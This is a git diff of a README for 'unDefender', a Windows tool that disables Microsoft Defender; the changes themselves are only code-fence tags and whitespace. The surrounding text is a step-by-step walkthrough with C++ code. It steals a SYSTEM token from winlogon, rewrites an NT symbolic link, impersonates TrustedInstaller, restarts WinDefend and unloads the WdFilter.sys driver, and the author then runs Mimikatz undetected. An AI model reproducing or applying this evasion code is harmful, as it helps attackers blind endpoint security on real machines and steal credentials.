@@ -36,7 +36,7 @@ All the functions used in the program are defined in the `common.h` header. Here
 ### Getting SYSTEM
 First things first, we elevate our token to a SYSTEM one. This is easily done through the `GetSystem` function, implemented in the `GetSystem.cpp` file. Here we basically open `winlogon.exe`, a SYSTEM process running unprotected in every Windows session,  using the `OpenProcess` API. After that we open its token, through `OpenProcessToken`, and impersonate it using `ImpersonateLoggedOnUser`, easy peasy. 
 
-```C++
+```c++
 #include "common.h"
 
 bool GetSystem()
@@ -73,7 +73,7 @@ bool GetSystem()
 After getting SYSTEM we need to backup the current state of the symbolic link, so that we can programmatically restore it later. This is done through the `GetSymbolicLinkTarget` implemented in the `GetSymbolicLinkTarget.cpp` file. After resolving the address of the Nt functions (skipped in the following snippet) we define two key data structures: a `UNICODE_STRING` and an `OBJECT_ATTRIBUTES`. These two are initialized through the `RtlInitUnicodeString` and `InitializeObjectAttributes` APIs. The `UNICODE_STRING` is initialized using the `symLinkName` variable, which is of type `std::wstring` and is one of the arguments passed to `GetSymbolicLinkTarget` by the main function. The first one is a structure the Windows kernel uses to work with unicode strings (duh!) and is necessary for initializing the second one, which in turn is used to open a handle to the NT symlink using  the `NtOpenSymbolicLinkObject` native API with `GENERIC_READ` access. Before that though we define a `HANDLE` which will be filled by `NtOpenSymbolicLinkObject` itself and that we will assign to the corresponding RAII type (I have yet to implement a way of doing it directly without using a temporary disposable variable, I'm lazy).
 
 Done that we proceed to initialize a second `UNICODE_STRING` which will be used to store the symlink target retrieved by  the `NtQuerySymbolicLinkObject` native API, which takes as arguments the `RAII::Handle` we initialized before, the second `UNICODE_STRING` we just initialized and a `nullptr` as we don't care about the number of bytes read. Done that we return the buffer of the second `UNICODE_STRING` and call it a day.
-```C++
+```c++
 UNICODE_STRING symlinkPath;
 RtlInitUnicodeString(&symlinkPath, symLinkName.c_str());
 OBJECT_ATTRIBUTES symlinkObjAttr{};
@@ -103,7 +103,7 @@ return LinkTarget.Buffer;
 ### Changing the symbolic link
 Now that we have stored the older symlink target it's time we change it. To do so we once again setup the two `UNICODE_STRING` and `OBJECT_ATTRIBUTES` structures that will identify the symlink we want to target and then call the native function `NtOpenSymbolicLink` to get a handle to said symlink with `DELETE` privileges.
 
-```C++
+```c++
 UNICODE_STRING symlinkPath;
 RtlInitUnicodeString(&symlinkPath, symLinkName.c_str());
 OBJECT_ATTRIBUTES symlinkObjAttr{};
@@ -115,13 +115,13 @@ NTSTATUS status = NtOpenSymbolicLinkObject(&symlinkHandle, DELETE, &symlinkObjAt
 
 After that, we proceed to delete the symlink. To do that we first have to call the native function `NtMakeTemporaryObject` and pass it the handle to the symlink we just got. That's because this kind of symlinks are created with the `OBJ_PERMANENT` attribute, which increases the reference counter of their kernel object in kernelspace by 1. This means that even if all handles to the symbolic link are closed, the symbolic link will continue to live in the kernel object manager. So, in order to delete it we have to make the object no longer permanent (hence temporary), which means `NtMakeTemporaryObject` simply decreases the reference counter by one. When we call  the `CloseHandle` API after that on the handle of the symlink, the reference counter goes to zero and the object is destroyed:
 
-```C++
+```c++
 status = NtMakeTemporaryObject(symlinkHandle);
 CloseHandle(symlinkHandle);
 ```
 
 Once we have deleted the symlink it's time to recreate it and make it point to the new target. This is done by initializing again a `UNICODE_STRING` and a `OBJECT_ATTRIBUTES` and calling the `NtCreateSymbolicLinkObject` API:
-```C++
+```c++
 UNICODE_STRING target;
 RtlInitUnicodeString(&target, newDestination.c_str());
 UNICODE_STRING newSymLinkPath;
@@ -156,7 +156,7 @@ We need to impersonate TrustedInstaller because the Defender and WdFilter servic
 
 ##### Step 1 - Starting TrustedInstaller
 The first thing to do is starting the TrustedInstaller service. To do so we need to get a `HANDLE` (actually a `SC_HANDLE`, which is a particular type of `HANDLE` for the Service Control Manager.) on the Service Control Manager using the `OpenSCManagerW` API, then use that `HANDLE` to call `OpenServiceW` on the TrustedInstaller service and get a `HANDLE` on it, and finally pass that other `HANDLE` to `StartServiceW`. This will start the TrustedInstaller service, which in turn will start the TrustedInstaller process, whose token contains the SID of `NT SERVICE\TrustedInstaller`. Pretty straightforward, here's the code:
-```C++
+```c++
 RAII::ScHandle svcManager = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
 if (!svcManager.GetHandle())
 {
@@ -185,7 +185,7 @@ else std::cout << "[+] Successfully started the TrustedInstaller service!\n";
 ```
 ##### Step 2 - Opening TrustedInstaller's first thread
 Now that the TrustedInstaller process is alive, we need to open a handle its first thread, so that we can call  the native API `NtImpersonateThread` on it in step 3. This is done using the following code:
-```C++
+```c++
 auto trustedInstPid = FindPID(L"TrustedInstaller.exe");
 if (trustedInstPid == ERROR_FILE_NOT_FOUND)
 {
@@ -211,7 +211,7 @@ else std::cout << "[+] Opened a THREAD_DIRECT_IMPERSONATION handle to the Truste
 `FindPID` and `GetFirstThreadID` are two helper functions I implemented in `FindPID.cpp` and `GetFirstThreadID.cpp` which do exactly what their names tell you: they find the PID of the process you pass them and give you the TID of its first thread, easy. We need the first thread as it will have for sure the `NT SERVICE\TrustedInstaller` SID in it. Once we've got the thread ID we pass it to the `OpenThread` API with the `THREAD_DIRECT_IMPERSONATION` access right, which enables us to use the returned handle with `NtImpersonateThread` later.
 ##### Step 3 - Impersonating TrustedInstaller
 Now that we have a powerful enough handle we can call `NtImpersonateThread` on it. But first we have to initialize a `SECURITY_QUALITY_OF_SERVICE` data structure to tell the kernel which kind of impersonation we want to perform, in this case `SecurityImpersonation`, that's a impersonation level which allows us to impersonate the security context of our target locally ([look here for more information on Impersonation Levels](https://docs.microsoft.com/en-us/windows/win32/secauthz/impersonation-levels)):
-```C++
+```c++
 SECURITY_QUALITY_OF_SERVICE sqos = {};
 sqos.Length = sizeof(sqos);
 sqos.ImpersonationLevel = SecurityImpersonation;
@@ -228,7 +228,7 @@ else
 If `NtImpersonateThread` did its job well our thread should have the SID of TrustedInstaller now. Note: in order not to fuck up the main thread's token, `ImpersonateAndUnload` is called by main in a sacrificial `std::thread`. Now that we have the required access rights, we can go to step 4 and actually unload the driver.
 ##### Step 4 - Unloading WdFilter.sys
 To unload WdFilter we first have to release the lock imposed on it by Defender itself. This is achieved by restarting the WinDefend service using the same approach we used to start TrustedInstaller's one. But first we need to give our token the ability to load and unload drivers. This is done by enabling the `SeLoadDriverPrivilege` in our security context by calling the helper function `SetPrivilege`, defined in `SetPrivilege.cpp`, and by passing it our thread's token and the privilege we want to enable:
-```C++
+```c++
 HANDLE tempHandle;
 success = OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, false, &tempHandle);
 if (!success)
@@ -244,7 +244,7 @@ if (!success) return 1;
 ```
 
 Once we have the `SeLoadDriverPrivilege` enabled we proceed to restart Defender's service, WinDefend:
-```C++
+```c++
 RAII::ScHandle winDefendSvc = OpenServiceW(svcManager.GetHandle(), L"WinDefend", SERVICE_ALL_ACCESS);
 if (!winDefendSvc.GetHandle())
 {
@@ -278,7 +278,7 @@ else std::cout << "[+] Successfully restarted the WinDefend service!\n";
 
 The only thing different from when we started TrustedInstaller's service is that we first have to stop the service using the `ControlService` API (by passing the `SERVICE_CONTROL_STOP` control code) and then start it back using `StartServiceW` once again. Once Defender's restarted, the lock on WdFilter is released and we can call `NtUnloadDriver` on it:
 
-```C++
+```c++
 UNICODE_STRING wdfilterDrivServ;
 RtlInitUnicodeString(&wdfilterDrivServ, L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\Wdfilter");
 
@@ -303,7 +303,8 @@ Now that WdFilter has been unloaded, Defender's tamper protection should kick in
 In the demo you can notice a few things:
 - the moment WdFilter is unloaded you can see its entry in Process Hacker turning red;
 - the moment tamper protection kicks in, WdFilter comes right back in green;
-- I managed to copy and run Mimikatz without Defender complaining.
+- I managed to copy and run Mimikatz without Defender complaining.  
+  
 Note: Defender's icon became yellow in the lower right because it was unhappy with me disabling automatic sample submission, it's unrelated to unDefender.
 
 ### References
